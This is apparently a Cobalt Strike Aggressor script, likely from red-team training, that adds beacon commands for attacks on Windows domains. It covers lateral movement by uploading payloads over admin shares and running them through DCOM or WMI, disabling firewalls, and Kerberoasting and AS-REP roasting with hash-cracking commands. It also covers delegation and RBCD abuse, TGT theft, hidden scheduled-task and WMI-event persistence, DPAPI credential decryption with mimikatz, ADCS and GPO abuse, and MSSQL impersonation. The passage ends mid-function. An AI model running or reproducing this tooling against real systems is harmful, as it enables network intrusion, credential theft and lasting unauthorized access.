# $1 is beacon id
# $2 target
# $3 selected listener

#GLOBAL VARIABLES
$SHARPWMI_BIN_PATH  = getFileProper("C:\\Tools\\SharpWMI\\SharpWMI\\bin\\Release","SharpWMI.exe");
$INVOKE_DCOM_PATH   = getFileProper("C:\\Tools","Invoke-DCOM.ps1");
$POWERVIEW_PATH     = getFileProper("C:\\Tools\\PowerSploit\\Recon", "PowerView.ps1");
$RUBEUS_PATH        = getFileProper("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release","Rubeus.exe");
$SEATBELT_PATH      = getFileProper("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release","Seatbelt.exe");
$ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release","ADSearch.exe");
$SHAREPERSIST_PATH  = getFileProper("C:\\Tools\\SharPersist\\SharPersist\\bin\\Release","SharPersist.exe");
$SHARPUP_PATH       = getFileProper("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release","SharpUp.exe");
$GETSERVICEACL_PATH = getFileProper("c:\\Tools","Get-ServiceAcl.ps1");
$POWERLURK_PATH     = getFileProper("C:\\Tools","PowerLurk.ps1");
$CERTIFY_PATH       = getFileProper("C:\\Tools\\Certify\\Certify\\bin\\Release","Certify.exe");
$SHARPGPOABUSE_PATH = getFileProper("C:\\Tools\\SharpGPOAbuse\\SharpGPOAbuse\\bin\\Release","SharpGPOAbuse.exe");
$POWERUP_PATH       = getFileProper("C:\\Tools\\PowerSploit\\Privesc","PowerUp.ps1");
$POWERUPSQL_PATH    = getFileProper("C:\\Tools\\PowerUpSQL","PowerUpSQL.ps1");
$SQLRECON_PATH      = getFileProper("C:\\Tools\\SQLRecon\\SQLRecon\\SQLRecon\\bin\\Release","SQLRecon.exe");
$SHARPSCCM_PATH     = getFileProper("C:\\Tools\\SharpSCCM\\bin\\Release","SharpSCCM.exe");

#TEST FUNCTION
command beacons {
   local('$entry $key $value');
   foreach $entry (beacons()) {
      println("== " . $entry['id'] . " ==");
      foreach $key => $value ($entry) {
         println("$[20]key : $value");
      }
      println();
   }
}

#dummy callback to get stuff to run in the correct order
sub dummby_cb{
    blog($1,$2);
}
#generate random printable text of $length
sub rand_alphanum {
    local('$length $out $charstr $i $index');
    $length = $1;
    $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
    $out = '';
    for($i = 0; $i < $length; $i++)
    {
        $index = rand(strlen($charstr));
        $out = $out . substr($charstr, $index, $index + 1);
    }
    return $out;
}

#ADD INVOKE_DCOM TO JUMP COMMAND
sub invoke_dcom
{
    local('$handle $script $oneliner $filename $payload');

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\ $+ $filename $+ ", $payload);

    println("Invoke-DCOM Oneliner: " . $oneliner);
    println("Filename: ". $filename);
    #execute script from powerpick
    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command C:\\Windows\\ $+ $filename $+ ", $oneliner);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to run remote beacon", &invoke_dcom)

#ADD INVOKE-DCOM TO REMOTE-EXEC COMMAND
sub invoke_dcom_remoteexec
{
    local('$handle $script $oneliner');

    #beacon acknowledgement
    btask($1, "Task Beacon to run remote-exec on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command  $+ $3 $+ ", $oneliner);
}
beacon_remote_exec_method_register("invoke-dcom", "Remote execute via powershell Invoke-DCOM", &invoke_dcom_remoteexec);

#ADD SHARPWMI TO JUMP COMMAND
sub sharpwmi
{
    local('$binpath $uploadpath $filename $args $payload')

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via SharpWMI");
    println("Running jump sharpwmi.")

    #define binary path
    $binpath = $SHARPWMI_BIN_PATH;

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    $uploadpath = "\\\\ $+ $2 $+ \\C$\\Windows\\ $+ $filename $+ ";
    println("Uploading binary to:" . $uploadpath);
    bupload_raw($1, $uploadpath, $payload);

    #execute script from powerpick
    $args = "action=exec computername= $+ $2 $+  command= $+ $uploadpath $+ ";
    println("Execution args: " . $args);
    bexecute_assembly($1, $binpath, $args);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("sharpwmi", "x64", "Uses SharpWMI to run remote beacon", &sharpwmi)

alias import_powerview {
    bpowershell_import($1, $POWERVIEW_PATH);
}
beacon_command_register(
    "import_powerview",
    "Imports Powerview into current beacon"
);

alias import_powerup {
    bpowershell_import($1, $POWERUP_PATH);
}
beacon_command_register(
    "import_powerup",
    "Imports PowerUp into current beacon"
);

alias import_powerupsql {
    bpowershell_import($1, $POWERUPSQL_PATH);
}
beacon_command_register(
    "import_powerupsql",
    "Imports PowerUpSQL into current beacon"
);

#FIREWALL ALIASES
alias shieldsdown {
    #This function creates a service on the remote host, starts it, and cleans it up.
    bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
}
beacon_command_register(
    "shieldsdown",
    "Disables host firewall"
);

alias openport {
    #powerpick new-netfirewallrule -displayname "8445-INBOUND" -Direction inbound -protocol tcp -action allow -localport 8445
    bpowerpick($1, "new-netfirewallrule -displayname \" $+ $2 $- -INBOUND\" -Direction inbound -protocol tcp -action allow -localport  $+ $2 $- ")
}
beacon_command_register(
    "openport",
    "Opens the port specified",
    "Opens the port specified"
);

#EXECUTE ASSEMBLY ALIAS
alias rubeus {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $RUBEUS_PATH, $args);
}
beacon_command_register(
    "rubeus",
    "Execute Assmembly of Rubeus",
    "Execute Assmembly of Rubeus"
);
alias certify {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $CERTIFY_PATH, $args);
}
beacon_command_register(
    "certify",
    "Execute Assmembly of Certify",
    "Execute Assmembly of Certify"
);

alias seatbelt {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $SEATBELT_PATH, $args)
}
beacon_command_register(
    "seatbelt",
    "Execute Assmembly of Seatbelt",
    "Execute Assmembly of Seatbelt"
);

alias adsearch {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $ADSEARCH_PATH, $args)
}
beacon_command_register(
    "adsearch",
    "Execute Assmembly of ADSearch",
    "Execute Assmembly of ADSearch"
);

#KERBEROASTING
#FIND TARGETS
alias kerberos_roast_findtargets {
    bpowerpick($1, 'Get-NetUser -SPN | select serviceprincipalname,userprincipalname');
}
beacon_command_register(
    "kerberos_roast_findtargets",
    "User PowerView to find SPNs",
    "User PowerView to find SPNs"
);

#GRABBING KRB5TGS HASH
sub kerberos_roast_tgsreq_cb{
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 13100 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5tgs --wordlist=wordlist <user>'");
}
alias kerberos_roast_tgsreq{
    bexecute_assembly($1, $RUBEUS_PATH, 'kerberoast /nowrap /user:' . $2, $null, &kerberoast_tgsreq_cb);
}
beacon_command_register(
    "kerberos_roast_tgsreq",
    "Request the TGS with Rubeus"
);

#AS-REP ROASTING
#FIND TARGETS
alias kerberos_asreproast_findtargets {
   bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname');
}
beacon_command_register(
    "kerberos_asreproast_findtargets",
    "Find AS-REP roastable targets",
    "Find AS-REP roastable targets"
);

#REQUEST HASH
sub asreproast_requesthash_cb {
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 18200 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5asrep --wordlist=wordlist <user>'");
}
alias kerberos_asreproast_requesthash {
    bexecute_assembly($1, $RUBEUS_PATH, 'asreproast /nowrap /user:' . $2, $null, &asreproast_requesthash_cb);
}
beacon_command_register(
    "kerberos_asreproast_requesthash",
    "Get the specified user KRB5ASREP hash",
    "Get the specified user KRB5ASREP hash"
);

#UNCONSTRAINED DELEGATION
#FINDING TARGETS
alias kerberos_unconstdel_findtargets {
    # bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname')
    bexecute_assembly($1, $ADSEARCH_PATH, '--search "(userAccountControl:1.2.840.113556.1.4.803:=524288)" --attributes samaccountname,dnshostname')
}
beacon_command_register(
    "kerberos_unconstdel_findtargets",
    "ADSearch to find Unconstrained Delegation Targets",
    "ADSearch to find Unconstrained Delegation Targets"
)

#CONSTRAINED DELEGATION
#FINDING TARGETS
alias kerberos_constdel_findtargets {
    # bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=\*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
    bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(msds-allowedtodelegateto=\*)\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
}
beacon_command_register(
    "kerberos_constdel_findtargets",
    "Find Constrained Delegation Targets"
);

#TRIAGE THEN DUMP TGT
sub constdel_stealtgt_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$hostname $regx_luid $luid');

    $hostname = lc(binfo($1, "computer"));
    #println("hostname: " . $hostname);

    $regx_luid = '(0x\w+).*' . $hostname . '\$';
    
    $luid = matches($2, $regx_luid)[0];

    blog($1, $2);
    blog($1, "Targetting LUID:" . $luid);

    #dump ticket for krbtgt with $luid
    bexecute_assembly($1, $RUBEUS_PATH, "dump /nowrap /service:krbtgt /luid:" . $luid);
}
alias kerberos_constdel_stealtgt {
    #execute assembly and pass results to helper sub, run LUID
    bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel_stealtgt_cb);
}
beacon_command_register(
    "kerberos_constdel_stealtgt",
    "Steal the local machine TGT",
    "Steal the local machine TGT"
);

#ROLE BASED CONSTRAINED DELEGATION
#FINDING TARGETS.
sub kerberos_rbcd_findtargets_cb {
    local('$regex $sid $command');
    blog($1,$2);

    $regex = '(.*)-513';
    $sid = matches($2, $regex)[0];

    blog($1, "Targetting SID: " . $sid);

    $command = 'Get-DomainComputer |'
    . 'Get-DomainObjectAcl -ResolveGUIDs |'
    . '? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "'
    . $sid
    . '-[\d]{4,10}" }';

    bpowerpick($1,$command);
}
alias kerberos_rbcd_findtargets {
    $command = 'Convert-NameToSid "Domain Users"';
    bpowerpick($1, $command, $null, $null, &kerberos_rbcd_findtargets_cb)
}
beacon_command_register(
    "kerberos_rbcd_findtargets",
    "Find Role Based Constrained Delegation Machines");

alias kerberos_rbcd_injectaccess {
    $size = size(@_);
    if ($size == 3) {
        $target    = @_[1];
        $donorsid  = @_[2];

        blog($1, "TARGET = " . $target . "\ndonorside = " . $donorsid);
        $parameters = "\$rsd\="
        . 'New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;'
        . $donorsid
        . ')";'
        . ' $rsdb = New-Object byte[] ($rsd.BinaryLength);'
        . ' $rsd.GetBinaryForm($rsdb, 0);'
        . ' Get-DomainComputer -Identity "'
        . $target
        . '" |'
        . " Set-DomainObject -Set @\{\'msDS-AllowedToActOnBehalfOfOtherIdentity\' = \$rsdb\} -Verbose";
        
        bpowerpick($1, $parameters);
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
}
beacon_command_register(
    "kerberos_rbcd_injectaccess",
    "Uses PowerView to inject SDDL into a target machine from a compromised machine account",
    "Uses PowerView to inject SDDL into a target machine from a compromised machine account\n\n"
    . "Usage: kerberos_rbcd_injectaccess [target machine] [donor machine sid]\n"
)

#PERSISTANCE METHODS
## SCHEDULED TASKS
alias persist_schtask {
    $rand = rand_alphanum(4);

    if ( $2 ismatch 'psh') {
        blog($1, "Executing Powershell Persistance");
        $b64payload = $3;
        
        $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
        $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
        $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
    } else if ( $2 ismatch 'local') {
        blog($1, "Executing Local Binary Persistance");
        $payload = $3;

        $parameters = '-t schtask -c "' . $payload . '"';
        $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
    } else {
        berror($1, "Invalid Parameter.");
        return;
    }

    bexecute_assembly($1, $SHAREPERSIST_PATH, $parameters);
}
beacon_command_register(
    "persist_schtask",
    "Does persistance stuff",
    "Install a backdoored scheduled task\n"
    . "Takes a base64 encoded command for powershell\n"
    . "or a path to an executable to run hourly\n\n"
    . "Usage:\npersist_schtask psh [base64]\n"
    . "persist_schtask local [path] "
);

##WMI EVENTS
alias persist_wmievent{
    #$1 beaconid
    #$2 name
    #$3 processname
    #$4 listener

    #check if beacon is elevated
    if(-isadmin $1){
        #beacon acknowledgement
        btask($1, "Task Beacon to register WMI Event");

        #import the script
        $handle = openf($POWERLURK_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        #generate payload (stageless)
        $payload = artifact_payload($4, "exe", "x64");
        $filename = rand_alphanum(4) . ".exe";

        #upload payload to target
        $upload_path = "C:\\Windows\\Temp\\ $+ $filename $+ ";
        bupload_raw($1, $upload_path , $payload);

        bpowerpick($1, "Register-MaliciousWmiEvent -EventName $2 -PermanentCommand \" $+ $upload_path $+ \" -Trigger ProcessStart -ProcessName $3", $oneliner);
    } else {
        berror($1, "Can only be run from elevated access.");
    }
}
beacon_command_register(
    "persist_wmievent",
    "Use PowerLurk to create triggers for wmi events",
    "Usage: persist_wmievent [Name] [ProcessName] [listener]"
)

#PRIVILEGE ESCALATION HELPERS
##UNQUOTED SERVICE PATHS
alias privesc_unquotedpath {
    bexecute_assembly($1, $SHARPUP_PATH, "audit UnquotedServicePath");
}
beacon_command_register(
    "privesc_unquotedpath",
    "Checkes Unquoted Paths",
    "Uses SharpUp to check for unquoted service paths"
);

##WEAK SERVICE PERMS
sub privesc_weaksvcperms_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$regx_service $service $script $oneliner');
    
    $regx_service = '\sService \'(\w+)\'';
    
    $services = matches($2, $regx_service);
    
    blog($1, $2);

    foreach $service ($services) {
        blog($1, "Vulnerable Services: ". $service);

        #import the script
        $handle = openf($GETSERVICEACL_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        bpowerpick($1, "get-serviceacl -name " . $service . " | select -expand Access", $oneliner);

    }
}
alias privesc_weaksvcperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServices", $null, &privesc_weaksvcperms_cb);
}
beacon_command_register(
    "privesc_weaksvcperms",
    "Checkes for weak service permissions",
    "Uses SharpUp to check for weak service permissions"
);

##WEAK SERVICE BINARY PERMS
sub privesc_weaksvcbinaryperms_cb {
    blog($1, $2);
    blog($1, "Use 'powerpick get-acl -Path <binpath> | fl' to check permissions");
    
}

alias privesc_weaksvcbinaryperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServiceBinaries", $null, &privesc_weaksvcbinaryperms_cb);
}
beacon_command_register(
    "privesc_weaksvcbinaryperms",
    "Checkes for weak service binary permissions",
    "Uses SharpUp to check for weak service binary permissions"
);

#DPAPI HACKAGE
##STORED USER CREDS
###FIND VAULTS
sub dpapi_findvaults_cb{
    blog($1, $2);
    blog($1, "Check for potential creds to target.");
}
alias dpapi_findvaults {
    bexecute_assembly($1, $SEATBELT_PATH, "WindowsVault", $null, &dpapi_findvaults_cb);
}
beacon_command_register("dpapi_findvaults", "Locate DPAPI Vaults w/ Seatbelt");

###FIND CREDENTIAL FILS
sub dpapi_findcredfiles_cb{
    blog($1, $2);
    blog($1, "Note the master key guid\nUse 'powerpick get-domainuser bfarmer | select -expand objectsid' to get userSID");
}
alias dpapi_findcredfiles {
    bexecute_assembly($1, $SEATBELT_PATH, "WindowsCredentialFiles", $null, &dpapi_findcredfiles_cb);
}
beacon_command_register("dpapi_findcredfiles", "Locate DPAPI Vaults w/ Seatbelt");

###REQUEST MASTERKEY FROM DC VIA RPC
alias dpapi_reqBackupMasterKey {
    #   C:\Users
    #$2 \bfarmer (username)
    #   \AppData\Roaming\Microsoft\Protect
    #$3 \S-1-5-21-569305411-121244042-2357301523-1104 (User SID)
    #$4 \bfc5090d-22fe-4058-8953-47f6882f549e (Master Key)
    
    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Roaming\\Microsoft\\Protect\\ $+ $3 $+ \\ $+ $4 $+ ";
    println("CredPath: " . $credpath);
    bmimikatz($1, "@dpapi::masterkey /in: $+ $credpath $+  /rpc");
}
beacon_command_register(
    "dpapi_reqBackupMasterKey",
    "Use mimikatz to request backup Masterkey from DC",
    "Usage: dpapi_reqBackupMasterKey [userid] [userSID] [MasterKeyGUID]"
);

###DECRYPT CREDENTIAL FILE
alias dpapi_decryptCredFile {
    #$2 (username)
    #$3 (Credential File UID)
    #$4 (master key)

    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Local\\Microsoft\\Credentials\\ $+ $3 $+ ";
    bmimikatz($1, "dpapi::cred /in: $+ $credpath $+  /masterkey: $+ $4 $+ ");
}
beacon_command_register(
    "dpapi_decryptCredFile",
    "Decrypte Credential with DPAPI Master Key",
    "Usage: dpapi_decryptCredFile [username] [Cred File UID] [MasterKey]"
);

##STORED SCHEDULED TASK CREDS
###FIND CREDENTIAL FILES
$files = @();
$currentfile = "";
$masterkey = '';
sub dpapi_schtask_listCredFiles_mimicred_cb {
    #$1 = beacon ID, $2 = results, $3 = information map
    #guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
    local('$regex');
    $regex = 'guidMasterKey.*\{(.*)\}';
    $masterkey = matches($2, $regex)[0];
    blog($1, "KeyGUID: " . $masterkey . " " . "File: " . $currentfile);
}
sub dpapi_schtask_listCredFiles_lscb {
    #$1 = beacon ID, $2 = the folder, $3 = results
    local('$regex');
    $regex = '(\p{XDigit}{32})';
    $files = matches($3, $regex);
    # blog($1, "Found Credential Files: " . $files);
    foreach $file ($files){
        $currentfile = $file;
        bmimikatz($1, "dpapi::cred /in: $+ $path $+ \\ $+ $file $+ ",$null,$null,&dpapi_schtask_listCredFiles_mimicred_cb);
    }
    blog($1, "Run the command 'mimikatz !sekurlsa::dpapi' to find the master key for the corresponding GUID")
}
alias dpapi_schtask_listCredFiles {
    $path = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
    bls($1, $path, &dpapi_schtask_listCredFiles_lscb);
}
beacon_command_register(
    "dpapi_schtask_listCredFiles",
    "List Scheduled Task Credential Files"
)

###GET CRED FILE MASTER KEY AND DECRYPT
alias dpapi_schtask_decryptCredFiles {
    #$1 =  beacon, $2 FileID, $3 MasterKey
    $mimikatzCommand = 'dpapi::cred ' .
    "/in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\ $+ $2 $+  " .
    "/masterkey: $+ $3 $+ ";

    bmimikatz($1, $mimikatzCommand);
}
beacon_command_register (
    "dpapi_schtask_decryptCredFiles",
    "Decrypt given Scheduled Tasks Credential File",
    "Usage: dpapi_schtask_decryptCredFiles [FileID] [MasterKey]"
);

#ADCS
##FIND CERT AUTHORITY
alias adcs_findcas {
    bexecute_assembly($1, $CERTIFY_PATH, "cas");
}
beacon_command_register(
    "adcs_findcas",
    "Find the Certificate Authority Server"
);

##FIND VULNERABLE TEMPLATES
alias adcs_checktempaltes{
    bexecute_assembly($1, $CERTIFY_PATH, "find /vulnerable");
}
beacon_command_register(
    "adcs_checktempaltes",
    "Look for vulnerable ADCS templates"
);

#GPO ABUSE METHODS
##FIND MODIFIABLE GPOs
alias gpo_findvulngpos {
    #bpowershell_import($1, $POWERVIEW_PATH);
    $command = 'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }';
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_findvulngpos",
    "Use PowerPick to find modifiable GPOs"
);
alias gpo_locategpo {
    #bpowershell_import($1, $POWERVIEW_PATH);
    $command = "Get-DomainGPO -Identity \" $+ $2 $+ \" | select displayname,gpcfilesyspath";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_locategpos",
    "Use PowerPick to find modifiable GPOs",
    "Usage: gpo_locategpos [GPO DN]"
);
alias gpo_convertfromsid {
    $command = "ConvertFrom-SID  $+ $2 $+ ";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_convertfromsid",
    "Use PowerPick to find modifiable GPOs",
    "Usage: gpo_convertfromsid [SID]"
);
alias gpo_sharpgpoabuse {
    bexecute_assembly($1, $SHARPGPOABUSE_PATH, $2);
}
beacon_command_register(
    "gpo_sharpgpoabuse",
    "Calls SharGPOAbuse.exe",
    "Usage: gpo_sharpgpoabuse \"<command>\""
)

#MSSQL HELPERS
## FIND SQL INSTANCES FROM DOMAIN
alias mssql_findinstances {
    bpowerpick($1, "Get-SQLInstanceDomain");
}
beacon_command_register(
    "mssql_findinstances",
    "Use PowerUpSQL to find MSSQL server instances"
);

alias mssql_connectiontest {
    bpowerpick($1, "Get-SQLConnectionTest -Instance \" $+ $2 $+ \"");
}
beacon_command_register(
    "mssql_connectiontest",
    "Use PowerUpSQL to test connction to a MSSQL server instances",
    "Usage: mssql_connectiontest [instance]"
);

alias mssql_getinstanceinfo {
    bpowerpick($1, "Get-SQLServerInfo -Instance \" $+ $2 $+ \"");
}
beacon_command_register(
    "mssql_getinstanceinfo",
    "Use PowerUpSQL to test connction to a MSSQL server instances",
    "Usage: mssql_getinstanceinfo [instance]"
);

alias mssql_guessdomaingroups {
    $query = 'Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }';
    bpowerpick($1, $query);
}
beacon_command_register(
    "mssql_guessdomaingroups",
    "Use PowerView to find AD Groups like *SQL*",
    "Usage: mssql_guessdomaingroups [instance]"
);

## TEST AUTHENTICATION
alias mssql_accesstestme {
    bexecute_assembly($1, $SQLRECON_PATH, "/a:wintoken /m:whoami /h:" . $2);
}
beacon_command_register(
    "mssql_accesstestme",
    "Use SQLRecon to test access to a MSSQL server instances",
    "Usage: mssql_accesstestme [instance]"
);

## TEST AUTHENTICATION
alias mssql_accesstestuser {
    println("mssql_accesstestuser: " . @_);
    $instance   = @_[1];
    $domain     = @_[2];
    $user       = @_[3];
    $password   = @_[4];

    $args = "/a:windomain /m:whoami "
    . " /h:" . $instance
    . " /d:" . $domain
    . " /u:" . $user
    . " /p:" . $password;

    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_accesstestuser",
    "Use SQLRecon to test access to a MSSQL server instances",
    "Usage: mssql_accesstestuser [instance] [domain] [user] [password]"
);

## EXECUTE QUERIES
alias mssql_query {
    $size       = size(@_);

    $args = "";
    if ($size == 3)
    {
        $instance   = @_[1];
        $query      = @_[2];

        $args = "/a:wintoken /m:query "
        . " /h:" . $instance
        . " /c:\"" . $query . "\"";
        println("mssql_checkimpersonation - args = " . $args);

    }
    else if ($size == 6)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $query      = @_[5];

        $args = "/a:windomain /m:query"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /c:\"" . $query . "\"";
        println("mssql_checkimpersonation - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_query",
    "Use SQLRecon to run query against an instance",
    "Usage:\n"
    . "mssql_query [instance] [query]\n"
    . "mssql_query [instance] [domain] [user] [password] [query]"
);

alias mssql_iquery {
    $size = size(@_);

    $args = "";
    if ($size == 4)
    {
        #[instance] [Impersonated User] [query]
        $instance   = @_[1];
        $impaccount = @_[2];
        $query      = @_[3];

        $args = "/a:wintoken /m:iquery "
        . " /h:" . $instance
        . " /i:" . $impaccount
        . " /c:\"" . $query . "\"";
        println("mssql_iquery - args = " . $args);

    }
    else if ($size == 7)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $query      = @_[6];

        $args = "/a:windomain /m:iquery"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:" . $impaccount
        . " /c:\"" . $query . "\"";
        println("mssql_iquery - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_iquery",
    "Use SQLRecon to run query against an instance",
    "Usage:\n"
    . "mssql_iquery [instance] [Impersonated User] [query]\n"
    . "mssql_iquery [instance] [domain] [user] [password] [Impersonated User] [query]"
);

alias mssql_checkimpersonation {
    $size = size(@_);

    $query_imperonsate = "SELECT \* FROM sys.server_permissions WHERE permission_name = \'IMPERSONATE\'";

    $args = "";
    if ($size == 2)
    {
        $instance   = @_[1];

        $args = "/a:wintoken /m:query "
        . " /h:" . $instance;
        # . " /c:\"" . $query_imperonsate . "\"";
        println("mssql_checkimpersonation - args = " . $args);
    }
    else if ($size == 5)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];

        $args = "/a:windomain /m:query"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password;
        # . " /c:\"" . $query_imperonsate . "\"";
        println("mssql_checkimpersonation - args = " . $args);
    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    # bexecute_assembly($1, $SQLRECON_PATH, $args, $null, &mssql_checkimpersonation_cb);
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query_imperonsate . "\"", $null, lambda({ mssql_checkimpersonation_cb ($1, $2, $args); }));
}
sub mssql_checkimpersonation_cb {
    blog($1, $2);
    $regex = '\p{Digit}+ \| \w+ \| \p{Digit}+ \| \p{Digit}+ \| (\p{Digit}+) \| (\p{Digit}+)';
    ($grantee, $grantor) = matches($2, $regex);
    
    $query = "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals WHERE principal_id =  $+ $grantor $+  OR principal_id =  $+ $grantee $+ ;";
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query . "\"");
}
beacon_command_register(
    "mssql_checkimpersonation",
    "Use SQLRecon to run query to check impersonation",
    "Usage:\n"
    . "mssql_checkimpersonation [instance]\n"
    . "mssql_checkimpersonation [instance] [domain] [user] [password]"
);

alias mssql_impersonatecommand {
    $size       = size(@_);

    $args = "";
    if ($size == 4)
    {
        # [instance] [impersonating account] [module]
        $instance   = @_[1];
        $impaccount = @_[2];
        $module     = @_[3];

        $args = "/a:wintoken"
        . " /m:" . $module
        . " /h:" . $instance
        . " /i:\"" . $impaccount . "\"";
        println("mssql_impersonatecommand - args = " . $args);

    }
    else if ($size == 6)
    {
        # [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $module     = @_[6];

        $args = "/a:windomain"
        . " /m:" . $module
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:\"" . $impaccount . "\"";
        println("mssql_impersonatecommand - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args);
}
beacon_command_register(
    "mssql_impersonatecommand",
    "Use SQLRecon to run impersionated module against an instance",
    "Usage:\n"
    . "mssql_impersonatecommand [instance] [impersonating account] [module]\n"
    . "mssql_impersonatecommand [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
);

sub mssql_irunoscmd_cb2 {
    #($1, $2, $3, $args)
    blog($1, $2);
    $args = $4;
    println("$4 = " . $4);
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /m:idisablexp");
}
sub mssql_irunoscmd_cb1 {
    #($1, $2, $3, $args, $command)
    blog($1, $2);
    $args = $4;
    $command = $5;
